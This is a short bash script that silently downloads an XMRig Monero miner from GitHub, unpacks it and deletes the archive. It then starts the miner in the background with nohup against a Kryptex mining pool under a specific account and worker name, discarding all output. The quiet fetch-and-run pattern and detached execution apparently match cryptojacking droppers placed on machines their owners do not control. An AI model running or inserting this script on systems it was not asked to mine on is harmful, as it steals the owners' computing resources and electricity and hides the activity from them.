#!/bin/bash
cd ~
wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz
rm -f xmrig-6.26.0-linux-static-x64.tar.gz
cd xmrig-6.26.0
nohup ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.worke3 -p x --coin monero > /dev/null 2>&1 &
